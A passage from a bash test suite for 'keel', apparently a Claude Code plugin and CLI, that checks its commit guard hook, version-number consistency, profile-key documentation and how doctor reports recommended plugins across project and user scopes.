( cd "$c" && "$KEEL" profile set gates.commit_guard warn >/dev/null 2>&1 )
( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
  && ok "warn reports the failure and allows the commit" \
  || bad "commit guard" "warn refused the commit"

# Passing commands, and the two shapes doctor also refuses to run: a null command and a templated
# one, neither of which can be executed as written.
( cd "$c" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.format 'test 1 = 1' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.lint 'eslint {path}' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.typecheck null >/dev/null 2>&1 )
( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
  && ok "the hook skips null and templated commands and allows the commit" \
  || bad "commit guard" "the hook ran a null or templated command"

( cd "$c" && "$KEEL" guard status 2>&1 | grep -qi "commit guard" ) \
  && ok "guard status reports the commit guard as well as the push guard" \
  || bad "commit guard" "status said nothing about the commit guard"

if command -v shellcheck >/dev/null 2>&1; then
    shellcheck -s bash "$c/.githooks/pre-commit" >/dev/null 2>&1 \
      && ok "the generated pre-commit hook is shellcheck clean" \
      || bad "commit guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$c/.githooks/pre-commit" 2>&1 | head -3)"
else
    printf '  SKIP  shellcheck is absent, so the generated pre-commit hook was not linted\n'
fi

( cd "$c" && "$KEEL" guard uninstall >/dev/null 2>&1 )
[ ! -e "$c/.githooks/pre-commit" ] && ok "guard uninstall removes the pre-commit hook too" \
  || bad "commit guard" "the pre-commit hook survived uninstall"
rm -rf "$c"

# ---- the two version numbers ----------------------------------------------
# VERSION drives the CLI and the value recorded in every project's profile. The version in
# .claude-plugin/plugin.json is what keys the installed plugin cache, so it is the one that decides
# whether an install picks a change up at all.
#
# They drifted once, silently: VERSION reached 0.3.0 with a whole feature behind it while
# plugin.json still said 0.2.0. Nothing failed. `keel version` was right, the CHANGELOG was right,
# and every install stayed on the previous skills, because the cache had already seen 0.2.0 and had
# no reason to fetch again. The symptom is a skill fix that reaches nobody and cannot be reproduced
# by its author, whose working tree is correct.
cli_version="$(cat "$ROOT/VERSION")"
plugin_version="$(sed -n 's/.*"version": "\(.*\)".*/\1/p' "$ROOT/.claude-plugin/plugin.json" | head -1)"
[ "$cli_version" = "$plugin_version" ] \
  && ok "VERSION and plugin.json agree ($cli_version)" \
  || bad "version drift" "VERSION is $cli_version, .claude-plugin/plugin.json is $plugin_version. The plugin cache is keyed on plugin.json, so installs stay on $plugin_version"

# The CHANGELOG's newest heading is the third copy of the number, and the one a human reads.
changelog_version="$(sed -n 's/^## \([0-9][0-9.]*\).*/\1/p' "$ROOT/CHANGELOG.md" | head -1)"
[ "$cli_version" = "$changelog_version" ] \
  && ok "CHANGELOG's newest entry matches VERSION ($cli_version)" \
  || bad "version drift" "VERSION is $cli_version, newest CHANGELOG entry is $changelog_version"

# The reference says which keys keel writes and which a human adds. That column is derived from a
# real init when the page is generated, and this is what stops it drifting afterwards. A
# hand-maintained list said twelve human-only keys until the context window work moved one, and
# nothing would have noticed.
c="$(fixture node-ts)"
( cd "$c" && "$KEEL" init -y >/dev/null 2>&1 )
drift="$(PAGE="$ROOT/docs/profile-keys.md" PROFILE="$c/.keel/profile.json" python3 -c "
import json, os, re
page = open(os.environ['PAGE']).read()
claimed = {}
for k, setby in re.findall(r'^\| \`([^\`]+)\` \| [^|]* \| ([^|]*) \|', page, re.M):
    claimed[k] = 'init' in setby
def leaves(o, p=''):
    s = set()
    if isinstance(o, dict):
        for k, v in o.items(): s |= leaves(v, f'{p}.{k}' if p else k)
    else: s.add(p)
    return s
actual = leaves(json.load(open(os.environ['PROFILE'])))
print(' '.join(sorted(k for k, says in claimed.items() if says != (k in actual))))
")"
[ -z "$drift" ] && ok "the reference's set-by column matches what keel init writes" \
  || bad "profile-keys" "the column disagrees with a real init for: $drift. Regenerate with tests/generate-profile-keys.sh"
rm -rf "$c"

# doctor has always been able to report a missing recommended plugin; it had nothing to check
# against. plugin_report reads plugins.recommended and falls back to a fixed three when it is
# absent, and init never wrote it, so no language server was ever named.
pr="$(fixture node-ts)"
( cd "$pr" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$pr/.keel/profile.json')).get('plugins',{}).get('recommended') or []
sys.exit(0 if 'typescript-lsp@claude-plugins-official' in r else 1)" \
  && ok "init records the language server for the detected stack" \
  || bad "plugins" "plugins.recommended does not name typescript-lsp"
rm -rf "$pr"

pg="$(fixture go)"
( cd "$pg" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$pg/.keel/profile.json')).get('plugins',{}).get('recommended') or []
sys.exit(0 if 'gopls-lsp@claude-plugins-official' in r else 1)" \
  && ok "a go project records gopls-lsp" \
  || bad "plugins" "plugins.recommended does not name gopls-lsp"
rm -rf "$pg"

# The case this whole half exists for. A repository that already has .claude/settings.json takes
# the merge path, which touches permissions and nothing else, so no plugin is enabled: not the
# language server, not keel@gbi. Until init wrote plugins.recommended, doctor could not see it.
pm="$(fixture node-ts)"
mkdir -p "$pm/.claude"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$pm/.claude/settings.json"
( cd "$pm" && "$KEEL" init -y >/dev/null 2>&1 )
# CLAUDE_CONFIG_DIR points at an empty directory so nothing is enabled at user scope. Without it
# this depends on the machine: a developer whose keel is enabled at user scope, which is how it is
# normally installed, would see doctor correctly stay quiet about keel@gbi and the assertion would
# fail for them and pass for everyone else.
mkdir -p "$pm/emptyconf"
out="$( cd "$pm" && CLAUDE_CONFIG_DIR="$pm/emptyconf" HOME="$pm" "$KEEL" doctor 2>&1 )"
case "$out" in *typescript-lsp*) ok "doctor names the missing language server on a mature repo" ;;
  *) bad "plugins" "doctor did not name typescript-lsp as missing" ;; esac
case "$out" in *keel@gbi*) ok "doctor names keel@gbi as not enabled when it is enabled nowhere" ;;
  *) bad "plugins" "doctor did not name keel@gbi as missing" ;; esac
case "$out" in *"/plugin install"*) ok "doctor names the command that installs it" ;;
  *) bad "plugins" "doctor reported a missing plugin without saying how to install it" ;; esac
rm -rf "$pm"

# A fresh repository has them enabled already, so it must stay quiet. A warning that fires on a
# healthy project is one people learn to scroll past.
pf="$(fixture node-ts)"
( cd "$pf" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$pf" && "$KEEL" doctor 2>&1 )"
case "$out" in *"recommended plugin not enabled"*) bad "plugins" "doctor warned on a fresh repo where init enabled everything" ;;
  *) ok "a fresh repository is not warned about plugins" ;; esac
rm -rf "$pf"

# Two deliberate non-behaviours, which are the kind most easily lost to a later helpful change.
ps="$(fixture node-ts)"
mkdir -p "$ps/.claude"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$ps/.claude/settings.json"
( cd "$ps" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$ps/.claude/settings.json'))
sys.exit(0 if 'enabledPlugins' not in s else 1)" \
  && ok "init adds no plugin entries to an existing settings file" \
  || bad "settings" "init wrote enabledPlugins into a file the project already had"

# The same path must still add the guardrails, which is the one thing it is for.
python3 -c "
import json,sys
p=json.load(open('$ps/.claude/settings.json')).get('permissions',{})
sys.exit(0 if p.get('deny') else 1)" \
  && ok "init still merges the permission guardrails into an existing settings file" \
  || bad "settings" "the permission merge stopped happening"

# A curated plugins.recommended is a human value and merge_profile must keep it.
python3 - "$ps" <<'PY5'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["plugins"]["recommended"]=["context7@claude-plugins-official"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY5
( cd "$ps" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$ps/.keel/profile.json'))['plugins']['recommended']
sys.exit(0 if r==['context7@claude-plugins-official'] else 1)" \
  && ok "a hand-edited plugins.recommended survives re-initialisation" \
  || bad "plugins" "re-init overwrote a curated plugin list"
rm -rf "$ps"

# A plugin enabled at user scope is enabled. plugin_report read only the project settings file,
# which was harmless while its fallback list was three plugins nobody enables per project. Once init
# wrote keel@gbi into plugins.recommended, every project whose keel is enabled at user scope, which
# is how it is normally installed, got a permanent warning that it was missing, alongside doctor's
# own line saying the marketplace is registered. The remedy it printed did not help either:
# /plugin install writes user scope, which is the scope this never read.
pu="$(fixture node-ts)"
mkdir -p "$pu/.claude" "$pu/userconf"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$pu/.claude/settings.json"
printf '{ "enabledPlugins": { "keel@gbi": true } }\n' > "$pu/userconf/settings.json"
( cd "$pu" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$pu" && CLAUDE_CONFIG_DIR="$pu/userconf" "$KEEL" doctor 2>&1 )"
case "$out" in *"not enabled: keel@gbi"*) bad "plugin scope" "doctor called keel@gbi missing while it is enabled at user scope" ;;
  *) ok "a plugin enabled at user scope is not reported missing" ;; esac
# And one that really is missing everywhere is still reported, so the fix does not silence the check.
case "$out" in *"not enabled: typescript-lsp"*) ok "a plugin missing from every scope is still reported" ;;
  *) bad "plugin scope" "the scope fix silenced a genuinely missing plugin" ;; esac
rm -rf "$pu"

rm -rf "$FIXTURE_CACHE"

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
